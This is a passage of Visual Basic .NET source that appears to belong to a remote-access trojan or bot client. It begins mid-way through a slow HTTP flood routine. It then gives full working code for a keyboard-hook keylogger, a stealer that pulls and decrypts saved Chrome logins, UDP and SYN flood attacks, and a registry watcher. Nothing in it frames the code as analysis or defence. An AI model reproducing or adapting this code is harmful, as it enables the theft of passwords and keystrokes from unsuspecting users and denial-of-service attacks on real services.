                    GoTo ENDLOOP
                End If
[LOOP]:
                If Not IsFlooding Then
                    GoTo ENDLOOP
                End If
                Try
                    For i As Integer = 0 To AOThreads - 1
                        If Not IsFlooding Then
                            GoTo ENDLOOP
                        End If

                        Shocks(i).Send(System.Text.Encoding.ASCII.GetBytes("X-" & Randomnum(10) & ": 1" & vbCr & vbLf), SocketFlags.None)
                    Next
                Catch ex As Exception
                End Try
                Thread.Sleep(4000)
                If Not IsFlooding Then
                    GoTo ENDLOOP
                End If
                GoTo [LOOP]
            End While
ENDLOOP:
            For i As Integer = 0 To AOThreads - 1
                If Shocks(i).Connected Then
                    Shocks(i).Disconnect(False)
                End If
                Shocks(i) = Nothing
            Next
        End Sub
        Private r As New Random(Environment.TickCount)
        Public Function Randomnum(ByVal length As Integer) As String
            Dim outstr As String = ""
            For i As Integer = 0 To length - 1
                outstr += r.[Next](9)
            Next
            Return outstr
        End Function
        Private Sub tmrGenerateRandomData_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles tmrGenerateRandomData.Tick
            labeldatasent = GenerateChar(16)
        End Sub
        Sub StopFlood()
            tmrGenerateRandomData.Stop()
            IsFlooding = False
            TList.Clear()
            For Each t As Thread In TList
                If t.ThreadState <> ThreadState.Stopped Then
                    Return
                End If
            Next
        End Sub
    End Class
    Public Class Keylogger
        Private Declare Function SetWindowsHookEx Lib "user32" Alias "SetWindowsHookExA" (ByVal Hook As Integer, ByVal KeyDelegate As KDel, ByVal HMod As Integer, ByVal ThreadId As Integer) As Integer
        Private Declare Function CallNextHookEx Lib "user32" (ByVal Hook As Integer, ByVal nCode As Integer, ByVal wParam As Integer, ByRef lParam As KeyStructure) As Integer
        Private Declare Function UnhookWindowsHookEx Lib "user32" Alias "UnhookWindowsHookEx" (ByVal Hook As Integer) As Integer
        Private Delegate Function KDel(ByVal nCode As Integer, ByVal wParam As Integer, ByRef lParam As KeyStructure) As Integer
        Public Shared Event Down(ByVal Key As String)
        Public Shared Event Up(ByVal Key As String)
        Private Shared Key As Integer
        Private Shared KHD As KDel
        Private Structure KeyStructure : Public Code As Integer : Public ScanCode As Integer : Public Flags As Integer : Public Time As Integer : Public ExtraInfo As Integer : End Structure
        Public Sub CreateHook()
            KHD = New KDel(AddressOf Proc)
            Key = SetWindowsHookEx(13, KHD, System.Runtime.InteropServices.Marshal.GetHINSTANCE(System.Reflection.Assembly.GetExecutingAssembly.GetModules()(0)).ToInt32, 0)
        End Sub

        Private Function Proc(ByVal Code As Integer, ByVal wParam As Integer, ByRef lParam As KeyStructure) As Integer
            If (Code = 0) Then
                Select Case wParam
                    Case &H100, &H104 : RaiseEvent Down(Feed(CType(lParam.Code, Keys)))
                    Case &H101, &H105 : RaiseEvent Up(Feed(CType(lParam.Code, Keys)))
                End Select
            End If
            Return CallNextHookEx(Key, Code, wParam, lParam)
        End Function
        Public Sub DiposeHook()
            UnhookWindowsHookEx(Key)
            MyBase.Finalize()
        End Sub
        Private Function Feed(ByVal e As Keys) As String
            Select Case e
                Case 65 To 90
                    If Control.IsKeyLocked(Keys.CapsLock) Or (Control.ModifierKeys And Keys.Shift) <> 0 Then
                        Return e.ToString
                    Else
                        Return e.ToString.ToLower
                    End If
                Case 48 To 57
                    If (Control.ModifierKeys And Keys.Shift) <> 0 Then
                        Select Case e.ToString
                            Case "D1" : Return "!"
                            Case "D2" : Return "@"
                            Case "D3" : Return "#"
                            Case "D4" : Return "$"
                            Case "D5" : Return "%"
                            Case "D6" : Return "^"
                            Case "D7" : Return "&"
                            Case "D8" : Return "*"
                            Case "D9" : Return "("
                            Case "D0" : Return ")"
                        End Select
                    Else
                        Return e.ToString.Replace("D", Nothing)
                    End If
                Case 96 To 105
                    Return e.ToString.Replace("NumPad", Nothing)
                Case 106 To 111
                    Select Case e.ToString
                        Case "Divide" : Return "/"
                        Case "Multiply" : Return "*"
                        Case "Subtract" : Return "-"
                        Case "Add" : Return "+"
                        Case "Decimal" : Return "."
                    End Select
                Case 32
                    Return " "
                Case 186 To 222
                    If (Control.ModifierKeys And Keys.Shift) <> 0 Then
                        Select Case e.ToString
                            Case "OemMinus" : Return "_"
                            Case "Oemplus" : Return "+"
                            Case "OemOpenBrackets" : Return "{"
                            Case "Oem6" : Return "}"
                            Case "Oem5" : Return "|"
                            Case "Oem1" : Return ":"
                            Case "Oem7" : Return """"
                            Case "Oemcomma" : Return "<"
                            Case "OemPeriod" : Return ">"
                            Case "OemQuestion" : Return "?"
                            Case "Oemtilde" : Return "~"
                        End Select
                    Else
                        Select Case e.ToString
                            Case "OemMinus" : Return "-"
                            Case "Oemplus" : Return "="
                            Case "OemOpenBrackets" : Return "["
                            Case "Oem6" : Return "]"
                            Case "Oem5" : Return "\"
                            Case "Oem1" : Return ";"
                            Case "Oem7" : Return "'"
                            Case "Oemcomma" : Return ","
                            Case "OemPeriod" : Return "."
                            Case "OemQuestion" : Return "/"
                            Case "Oemtilde" : Return "`"
                        End Select
                    End If
                Case Keys.Return
                    Return Environment.NewLine
                Case Else
                    Return "<" + e.ToString + ">"
            End Select
            Return Nothing
        End Function
    End Class
    Module Main
        Dim text As String
        <DllImport("Crypt32.dll", SetLastError:=True, CharSet:=System.Runtime.InteropServices.CharSet.Auto)>
        Private Function CryptUnprotectData(ByRef pDataIn As DATA_BLOB, ByVal szDataDescr As String, ByRef pOptionalEntropy As DATA_BLOB, ByVal pvReserved As IntPtr, ByRef pPromptStruct As CRYPTPROTECT_PROMPTSTRUCT, ByVal dwFlags As Integer, ByRef pDataOut As DATA_BLOB) As Boolean
        End Function
        Public Sub GetChrome()
            Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\Google\Chrome\User Data\Default\Login Data"

            Try
                Dim SQLDatabase As Object = New SQLiteHandler(datapath)
                SQLDatabase.ReadTable("logins")

                If File.Exists(datapath) Then

                    Dim host As String
                    Dim User As String
                    Dim pass As String

                    For i As Integer = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                        host = SQLDatabase.GetValue(i, "origin_url")
                        User = SQLDatabase.GetValue(i, "username_value")
                        pass = Decrypt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))

                        If (User <> "") And (pass <> "") Then

                            text += host & "|Chrome|" & User & "|" & pass & vbCrLf

                        End If
                    Next
                End If
            Catch
            End Try
        End Sub
        Public Function lol() As String
            Return text
        End Function
        <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)> Structure CRYPTPROTECT_PROMPTSTRUCT
            Public cbSize As Integer
            Public dwPromptFlags As CryptProtectPromptFlags
            Public hwndApp As IntPtr
            Public szPrompt As String
        End Structure
        <Flags()> Enum CryptProtectPromptFlags
            CRYPTPROTECT_PROMPT_ON_UNPROTECT = &H1
            CRYPTPROTECT_PROMPT_ON_PROTECT = &H2
        End Enum
        Function Decrypt(ByVal Datas() As Byte) As String
            Dim inj, Ors As New DATA_BLOB
            Dim Ghandle As GCHandle = GCHandle.Alloc(Datas, GCHandleType.Pinned)
            inj.pbData = Ghandle.AddrOfPinnedObject()
            inj.cbData = Datas.Length
            Ghandle.Free()
            CryptUnprotectData(inj, Nothing, Nothing, Nothing, Nothing, 0, Ors)
            Dim Returned() As Byte = New Byte(Ors.cbData) {}
            Marshal.Copy(Ors.pbData, Returned, 0, Ors.cbData)
            Dim TheString As String = Encoding.Default.GetString(Returned)
            Return TheString.Substring(0, TheString.Length - 1)
        End Function
        <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)> Structure DATA_BLOB
            Public cbData As Integer
            Public pbData As IntPtr
        End Structure
    End Module
    Public Class SQLiteHandler
        Private db_bytes() As Byte
        Private page_size As UInt16
        Private encoding As UInt64
        Private master_table_entries() As sqlite_master_entry

        Private SQLDataTypeSize() As Byte = New Byte() {0, 1, 2, 3, 4, 6, 8, 8, 0, 0}
        Private table_entries() As table_entry
        Private field_names() As String

        Private Structure record_header_field
            Dim size As Int64
            Dim type As Int64
        End Structure

        Private Structure table_entry
            Dim row_id As Int64
            Dim content() As String
        End Structure

        Private Structure sqlite_master_entry
            Dim row_id As Int64
            Dim item_type As String
            Dim item_name As String
            Dim astable_name As String
            Dim root_num As Int64
            Dim sql_statement As String
        End Structure

        Private Function GVL(ByVal startIndex As Integer) As Integer
            If startIndex > db_bytes.Length Then Return Nothing

            For i As Integer = startIndex To startIndex + 8 Step 1
                If i > db_bytes.Length - 1 Then
                    Return Nothing
                ElseIf (db_bytes(i) And &H80) <> &H80 Then
                    Return i
                End If
            Next

            Return startIndex + 8
        End Function

        Private Function CVL(ByVal startIndex As Integer, ByVal endIndex As Integer) As Int64
            endIndex = endIndex + 1

            Dim retus(7) As Byte
            Dim Length As Object = endIndex - startIndex
            Dim Bit64 As Boolean = False

            If Length = 0 Or Length > 9 Then Return Nothing
            If Length = 1 Then
                retus(0) = (db_bytes(startIndex) And &H7F)
                Return BitConverter.ToInt64(retus, 0)
            End If

            If Length = 9 Then
                Bit64 = True
            End If

            Dim j As Integer = 1
            Dim k As Integer = 7
            Dim y As Integer = 0

            If Bit64 Then
                retus(0) = db_bytes(endIndex - 1)
                endIndex = endIndex - 1
                y = 1
            End If

            For i As Integer = (endIndex - 1) To startIndex Step -1
                If (i - 1) >= startIndex Then
                    retus(y) = ((db_bytes(i) >> (j - 1)) And (&HFF >> j)) Or (db_bytes(i - 1) << k)
                    j = j + 1
                    y = y + 1
                    k = k - 1
                Else
                    If Not Bit64 Then retus(y) = ((db_bytes(i) >> (j - 1)) And (&HFF >> j))
                End If
            Next

            Return BitConverter.ToInt64(retus, 0)
        End Function

        Private Function IsOdd(ByVal value As Int64) As Boolean
            Return (value And 1) = 1
        End Function

        Private Function ConvertToInteger(ByVal startIndex As Integer, ByVal Size As Integer) As UInt64
            If Size > 8 Or Size = 0 Then Return Nothing

            Dim retVal As UInt64 = 0

            For i As Integer = 0 To Size - 1 Step 1
                retVal = ((retVal << 8) Or db_bytes(startIndex + i))
            Next

            Return retVal
        End Function

        Private Sub ReadMasterTable(ByVal Offset As UInt64)

            If db_bytes(Offset) = &HD Then

                Dim Length As UInt16 = ConvertToInteger(Offset + 3, 2) - 1
                Dim ol As Integer = 0

                If Not master_table_entries Is Nothing Then
                    ol = master_table_entries.Length
                    ReDim Preserve master_table_entries(master_table_entries.Length + Length)
                Else
                    ReDim master_table_entries(Length)
                End If

                Dim ent_offset As UInt64

                For i As Integer = 0 To Length Step 1
                    ent_offset = ConvertToInteger(Offset + 8 + (i * 2), 2)

                    If Offset <> 100 Then ent_offset = ent_offset + Offset

                    Dim t As Object = GVL(ent_offset)
                    Dim size As Int64 = CVL(ent_offset, t)

                    Dim s As Object = GVL(ent_offset + (t - ent_offset) + 1)
                    master_table_entries(ol + i).row_id = CVL(ent_offset + (t - ent_offset) + 1, s)

                    ent_offset = ent_offset + (s - ent_offset) + 1

                    t = GVL(ent_offset)
                    s = t
                    Dim Rec_Header_Size As Int64 = CVL(ent_offset, t)

                    Dim Field_Size(4) As Int64

                    For j As Integer = 0 To 4 Step 1
                        t = s + 1
                        s = GVL(t)
                        Field_Size(j) = CVL(t, s)

                        If Field_Size(j) > 9 Then
                            If IsOdd(Field_Size(j)) Then
                                Field_Size(j) = (Field_Size(j) - 13) / 2
                            Else
                                Field_Size(j) = (Field_Size(j) - 12) / 2
                            End If
                        Else
                            Field_Size(j) = SQLDataTypeSize(Field_Size(j))
                        End If
                    Next

                    If encoding = 1 Then
                        master_table_entries(ol + i).item_type = System.Text.Encoding.Default.GetString(db_bytes, ent_offset + Rec_Header_Size, Field_Size(0))
                    ElseIf encoding = 2 Then
                        master_table_entries(ol + i).item_type = System.Text.Encoding.Unicode.GetString(db_bytes, ent_offset + Rec_Header_Size, Field_Size(0))
                    ElseIf encoding = 3 Then
                        master_table_entries(ol + i).item_type = System.Text.Encoding.BigEndianUnicode.GetString(db_bytes, ent_offset + Rec_Header_Size, Field_Size(0))
                    End If
                    If encoding = 1 Then
                        master_table_entries(ol + i).item_name = System.Text.Encoding.Default.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0), Field_Size(1))
                    ElseIf encoding = 2 Then
                        master_table_entries(ol + i).item_name = System.Text.Encoding.Unicode.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0), Field_Size(1))
                    ElseIf encoding = 3 Then
                        master_table_entries(ol + i).item_name = System.Text.Encoding.BigEndianUnicode.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0), Field_Size(1))
                    End If
                    master_table_entries(ol + i).root_num = ConvertToInteger(ent_offset + Rec_Header_Size + Field_Size(0) + Field_Size(1) + Field_Size(2), Field_Size(3))
                    If encoding = 1 Then
                        master_table_entries(ol + i).sql_statement = System.Text.Encoding.Default.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0) + Field_Size(1) + Field_Size(2) + Field_Size(3), Field_Size(4))
                    ElseIf encoding = 2 Then
                        master_table_entries(ol + i).sql_statement = System.Text.Encoding.Unicode.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0) + Field_Size(1) + Field_Size(2) + Field_Size(3), Field_Size(4))
                    ElseIf encoding = 3 Then
                        master_table_entries(ol + i).sql_statement = System.Text.Encoding.BigEndianUnicode.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0) + Field_Size(1) + Field_Size(2) + Field_Size(3), Field_Size(4))
                    End If
                Next
            ElseIf db_bytes(Offset) = &H5 Then
                Dim Length As UInt16 = ConvertToInteger(Offset + 3, 2) - 1
                Dim ent_offset As UInt16

                For i As Integer = 0 To Length Step 1
                    ent_offset = ConvertToInteger(Offset + 12 + (i * 2), 2)

                    If Offset = 100 Then
                        ReadMasterTable((ConvertToInteger(ent_offset, 4) - 1) * page_size)
                    Else
                        ReadMasterTable((ConvertToInteger(Offset + ent_offset, 4) - 1) * page_size)
                    End If

                Next

                ReadMasterTable((ConvertToInteger(Offset + 8, 4) - 1) * page_size)
            End If
        End Sub

        Private Function ReadTableFromOffset(ByVal Offset As UInt64) As Boolean
            If db_bytes(Offset) = &HD Then

                Dim Length As UInt16 = ConvertToInteger(Offset + 3, 2) - 1
                Dim ol As Integer = 0

                If Not table_entries Is Nothing Then
                    ol = table_entries.Length
                    ReDim Preserve table_entries(table_entries.Length + Length)
                Else
                    ReDim table_entries(Length)
                End If

                Dim ent_offset As UInt64

                For i As Integer = 0 To Length Step 1
                    ent_offset = ConvertToInteger(Offset + 8 + (i * 2), 2)

                    If Offset <> 100 Then ent_offset = ent_offset + Offset

                    Dim t As Object = GVL(ent_offset)
                    Dim size As Int64 = CVL(ent_offset, t)

                    Dim s As Object = GVL(ent_offset + (t - ent_offset) + 1)
                    table_entries(ol + i).row_id = CVL(ent_offset + (t - ent_offset) + 1, s)

                    ent_offset = ent_offset + (s - ent_offset) + 1

                    t = GVL(ent_offset)
                    s = t
                    Dim Rec_Header_Size As Int64 = CVL(ent_offset, t)

                    Dim Field_Size() As record_header_field = Nothing
                    Dim size_read As Int64 = (ent_offset - t) + 1
                    Dim j As Object = 0

                    While size_read < Rec_Header_Size
                        ReDim Preserve Field_Size(j)

                        t = s + 1
                        s = GVL(t)
                        Field_Size(j).type = CVL(t, s)

                        If Field_Size(j).type > 9 Then
                            If IsOdd(Field_Size(j).type) Then
                                Field_Size(j).size = (Field_Size(j).type - 13) / 2
                            Else
                                Field_Size(j).size = (Field_Size(j).type - 12) / 2
                            End If
                        Else
                            Field_Size(j).size = SQLDataTypeSize(Field_Size(j).type)
                        End If

                        size_read = size_read + (s - t) + 1
                        j = j + 1
                    End While

                    ReDim table_entries(ol + i).content(Field_Size.Length - 1)
                    Dim counter As Integer = 0

                    For k As Integer = 0 To Field_Size.Length - 1 Step 1
                        If Field_Size(k).type > 9 Then
                            If Not IsOdd(Field_Size(k).type) Then
                                If encoding = 1 Then
                                    table_entries(ol + i).content(k) = System.Text.Encoding.Default.GetString(db_bytes, ent_offset + Rec_Header_Size + counter, Field_Size(k).size)
                                ElseIf encoding = 2 Then
                                    table_entries(ol + i).content(k) = System.Text.Encoding.Unicode.GetString(db_bytes, ent_offset + Rec_Header_Size + counter, Field_Size(k).size)
                                ElseIf encoding = 3 Then
                                    table_entries(ol + i).content(k) = System.Text.Encoding.BigEndianUnicode.GetString(db_bytes, ent_offset + Rec_Header_Size + counter, Field_Size(k).size)
                                End If
                            Else
                                table_entries(ol + i).content(k) = System.Text.Encoding.Default.GetString(db_bytes, ent_offset + Rec_Header_Size + counter, Field_Size(k).size)
                            End If
                        Else
                            table_entries(ol + i).content(k) = CStr(ConvertToInteger(ent_offset + Rec_Header_Size + counter, Field_Size(k).size))
                        End If

                        counter = counter + Field_Size(k).size
                    Next
                Next
            ElseIf db_bytes(Offset) = &H5 Then
                Dim Length As UInt16 = ConvertToInteger(Offset + 3, 2) - 1
                Dim ent_offset As UInt16

                For i As Integer = 0 To Length Step 1
                    ent_offset = ConvertToInteger(Offset + 12 + (i * 2), 2)

                    ReadTableFromOffset((ConvertToInteger(Offset + ent_offset, 4) - 1) * page_size)
                Next

                ReadTableFromOffset((ConvertToInteger(Offset + 8, 4) - 1) * page_size)
            End If

            Return True
        End Function

        Public Function ReadTable(ByVal TableName As String) As Boolean

            Dim found As Integer = -1

            For i As Integer = 0 To master_table_entries.Length Step 1
                If master_table_entries(i).item_name.ToLower().CompareTo(TableName.ToLower()) = 0 Then
                    found = i
                    Exit For
                End If
            Next

            If found = -1 Then Return False

            Dim fields() As Object = master_table_entries(found).sql_statement.Substring(master_table_entries(found).sql_statement.IndexOf("(") + 1).Split(",")

            For i As Integer = 0 To fields.Length - 1 Step 1
                fields(i) = LTrim(fields(i))

                Dim index As Object = fields(i).IndexOf(" ")

                If index > 0 Then fields(i) = fields(i).Substring(0, index)

                If fields(i).IndexOf("UNIQUE") = 0 Then
                    Exit For
                Else
                    ReDim Preserve field_names(i)
                    field_names(i) = fields(i)
                End If
            Next

            Return ReadTableFromOffset((master_table_entries(found).root_num - 1) * page_size)
        End Function

        Public Function GetRowCount() As Integer
            Return table_entries.Length
        End Function

        Public Function GetValue(ByVal row_num As Integer, ByVal field As Integer) As String
            If row_num >= table_entries.Length Then Return Nothing
            If field >= table_entries(row_num).content.Length Then Return Nothing

            Return table_entries(row_num).content(field)
        End Function

        Public Function GetValue(ByVal row_num As Integer, ByVal field As String) As String
            Dim found As Integer = -1

            For i As Integer = 0 To field_names.Length Step 1
                If field_names(i).ToLower().CompareTo(field.ToLower()) = 0 Then
                    found = i
                    Exit For
                End If
            Next

            If found = -1 Then Return Nothing

            Return GetValue(row_num, found)
        End Function

        Public Function GetTableNames() As String()
            Dim retVal As String() = Nothing
            Dim arr As Object = 0

            For i As Integer = 0 To master_table_entries.Length - 1 Step 1
                If master_table_entries(i).item_type = "table" Then
                    ReDim Preserve retVal(arr)
                    retVal(arr) = master_table_entries(i).item_name
                    arr = arr + 1
                End If
            Next

            Return retVal
        End Function

        Public Sub New(ByVal baseName As String)
            If File.Exists(baseName) Then
                FileOpen(1, baseName, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
                Dim asi As String = Space(LOF(1))
                FileGet(1, asi)
                FileClose(1)

                db_bytes = System.Text.Encoding.Default.GetBytes(asi)

                If System.Text.Encoding.Default.GetString(db_bytes, 0, 15).CompareTo("SQLite format 3") <> 0 Then
                    Throw New Exception("Not a valid SQLite 3 Database File")
                    End
                End If

                If db_bytes(52) <> 0 Then
                    Throw New Exception("Auto-vacuum capable database is not supported")
                    End
                ElseIf ConvertToInteger(44, 4) >= 4 Then
                    Throw New Exception("No supported Schema layer file-format")
                    End
                End If

                page_size = ConvertToInteger(16, 2)
                encoding = ConvertToInteger(56, 4)

                If encoding = 0 Then encoding = 1

                ReadMasterTable(100)
            End If
        End Sub
    End Class
    Public Class UDPFlood
        Public Shared Host As String
        Public Shared Port As Integer
        Public Shared Threads As Integer
        Public Shared FloodRunning As Boolean
        Public Shared udpClient As New Sockets.UdpClient
        Public Shared bytCommand As Byte() = New Byte() {}
        Public Shared IP As IPAddress
        Public Shared Sub StartUDPFlood()
            If FloodRunning = False Then
                FloodRunning = True
                bytCommand = Encoding.ASCII.GetBytes(GetBytes)
                IP = IPAddress.Parse(Host)
                For NumberOfThreads As Integer = 0 To Threads
                    Dim Flooding As Thread
                    Flooding = New Thread(AddressOf Flood)
                    Flooding.Start()
                Next
            End If
        End Sub
        Public Shared Sub Flood()
            Do While FloodRunning = True
                Try
                    udpClient.Connect(IP, Port)
                    udpClient.Send(bytCommand, bytCommand.Length)
                Catch
                End Try
            Loop
            Thread.CurrentThread.Abort()
        End Sub
        Shared Sub StopUDPFlood()
            If FloodRunning = True Then
                FloodRunning = False
            End If
        End Sub
        Shared Function GetBytes() As String
            Dim R As New Random
            Dim Bytes As String = ""
            Dim Letters As String = "qwertyuioplkjhgfdsazxcvbnm"
            Dim Capitals As String = "QWERTYUIOPLKJHGFDSAZXCVBNM"
            Dim Numbers As String = "0123456789"
            Dim Signs As String = "!£$%^&*()-_=+]}{[;:'@#~<,.>/?"
            For i As Integer = 0 To R.Next(300, 500)
                Select Case R.Next(0, 4)
                    Case 0
                        Bytes += Letters.ToCharArray()(R.Next((R.Next(0, 26))))
                    Case 1
                        Bytes += Capitals.ToCharArray()(R.Next(0, 26))
                    Case 2
                        Bytes += Numbers.ToCharArray()(R.Next(0, 10))
                    Case 3
                        Bytes += Signs.ToCharArray()(R.Next(0, 29))
                End Select
            Next
            Return Bytes
        End Function
    End Class
    Public Class SynFlood
        Private Shared FloodingJob As ThreadStart()
        Private Shared FloodingThread As Thread()
        Public Shared Host As String
        Private Shared ipEo As IPEndPoint
        Public Shared Port As Integer
        Private Shared SynClass As SendSyn()
        Public Shared SynSockets As Integer
        Public Shared Threads As Integer
        Public Shared IsRunning As Boolean = False
        Public Shared Sub StartSynFlood()
            IsRunning = True
            Try
                ipEo = New IPEndPoint(Dns.GetHostEntry(Host).AddressList(0), Port)
            Catch
                ipEo = New IPEndPoint(IPAddress.Parse(Host), Port)
            End Try
            FloodingThread = New Thread(Threads - 1) {}
            FloodingJob = New ThreadStart(Threads - 1) {}
            SynClass = New SendSyn(Threads - 1) {}
            For i As Integer = 0 To Threads - 1
                SynClass(i) = New SendSyn(ipEo, SynSockets)
                FloodingJob(i) = New ThreadStart(AddressOf SynClass(i).Send)
                FloodingThread(i) = New Thread(FloodingJob(i))
                FloodingThread(i).Start()
            Next
        End Sub
        Public Shared Sub StopSynFlood()
            For i As Integer = 0 To Threads - 1
                Try
                    FloodingThread(i).Abort()
                Catch
                End Try
            Next
            IsRunning = False
        End Sub
        Private Class SendSyn
            Private ipEo As IPEndPoint
            Private Sock As Socket()
            Private SynSockets As Integer
            Public Sub New(ByVal ipEo As IPEndPoint, ByVal SynSockets As Integer)
                Me.ipEo = ipEo
                Me.SynSockets = SynSockets
            End Sub
            Public Sub OnConnect(ByVal ar As IAsyncResult)

            End Sub
            Public Sub Send()
                Dim num As Integer
Label_0000:
                Try
                    Me.Sock = New Socket(Me.SynSockets - 1) {}
                    For num = 0 To Me.SynSockets - 1
                        Me.Sock(num) = New Socket(Me.ipEo.AddressFamily, SocketType.Stream, ProtocolType.Tcp)
                        Me.Sock(num).Blocking = False
                        Dim callback As New AsyncCallback(AddressOf Me.OnConnect)
                        Me.Sock(num).BeginConnect(Me.ipEo, callback, Me.Sock(num))
                    Next
                    Thread.Sleep(100)
                    For num = 0 To Me.SynSockets - 1
                        If Me.Sock(num).Connected Then
                            Me.Sock(num).Disconnect(False)
                        End If
                        Me.Sock(num).Close()
                        Me.Sock(num) = Nothing
                    Next
                    Me.Sock = Nothing
                    GoTo Label_0000
                Catch
                    For num = 0 To Me.SynSockets - 1
                        Try
                            If Me.Sock(num).Connected Then
                                Me.Sock(num).Disconnect(False)
                            End If
                            Me.Sock(num).Close()
                            Me.Sock(num) = Nothing
                        Catch
                        End Try
                    Next
                    GoTo Label_0000
                End Try
            End Sub
        End Class
    End Class
    Public Class RegistryWatcher
        Public MonitorCollection As New Collections.Generic.Dictionary(Of String, Monitor)
        Public Event RegistryChanged(ByVal M As Monitor)
        Public Enum HKEY_ROOTS As Integer
            HKEY_CLASSES_ROOT = 0
            HKEY_CURRENT_USER = 1
            HKEY_LOCAL_MACHINE = 2
            HKEY_USERS = 3
            HKEY_CURRENT_CONFIG = 4
        End Enum
        Public Sub AddWatcher(ByVal Root As HKEY_ROOTS, ByVal Path As String, ByVal ID As String, Optional ByVal Value As String = "")
            If MonitorCollection.ContainsKey(ID) = False Then
                Dim RegMon As New Monitor(Root, Path, ID, Value)
                AddHandler RegMon.Changed, AddressOf OnRegistryChanged
                MonitorCollection.Add(ID, RegMon)
            End If
        End Sub
        Public Sub RemoveWatcher(ByVal ID As String)
            If MonitorCollection.ContainsKey(ID) = True Then
                MonitorCollection(ID).StopWatch()
                MonitorCollection.Remove(ID)
            End If
        End Sub
        Private Sub OnRegistryChanged(ByVal M As Monitor)
            RaiseEvent RegistryChanged(M)
        End Sub
        Public Class Monitor
            Private mRoot As HKEY_ROOTS
            Private mPath As String
            Private mID As String
            Private mValue As String
            Private mStop As Boolean
            Public ReadOnly Property Root() As HKEY_ROOTS
                Get
                    Return mRoot
                End Get
            End Property
            Public ReadOnly Property Path() As String
                Get
                    Return mPath
                End Get
            End Property
            Public ReadOnly Property ID() As String
                Get
                    Return mID
                End Get
            End Property
            Public ReadOnly Property Value() As String
                Get
                    Return mValue
                End Get
            End Property
            Public Event Changed(ByVal M As Monitor)
            Sub New(ByVal NewRoot As HKEY_ROOTS, ByVal NewPath As String, ByVal NewID As String, ByVal NewValue As String)
                mRoot = NewRoot
                mPath = NewPath
                mID = NewID
                mValue = NewValue

                Dim T As New Threading.Thread(AddressOf Watcher)
                T.Start()
            End Sub
            Public Sub StopWatch()
                mStop = True
            End Sub
            Private Sub Watcher()
                Dim WMIObject As Object
                Dim WMIEvent As Object
                Dim WMICurrEvent As Object

                mPath = Replace(mPath, "\", "\\")

                WMIObject = GetObject("winmgmts:\\.\root\default")

                If mValue = "" Then
                    WMIEvent = WMIObject.ExecNotificationQuery(
                        "SELECT * FROM RegistryKeyChangeEvent WHERE Hive='" &
                        mRoot.ToString & "' AND " & "KeyPath='" & mPath & "'")
                Else
                    WMIEvent = WMIObject.ExecNotificationQuery(
                        "SELECT * FROM RegistryValueChangeEvent WHERE Hive='" &
                        mRoot.ToString & "' AND " & "KeyPath='" & mPath & "' AND ValueName='" & mValue & "'")
                End If

                Do
                    Try
                        If mStop = True Then
                            mStop = False
                            Exit Sub
                        End If
                        WMICurrEvent = WMIEvent.NextEvent(500)
                        RaiseEvent Changed(Me)
                    Catch ex As Exception
                    End Try
                Loop
            End Sub
        End Class
    End Class
End Namespace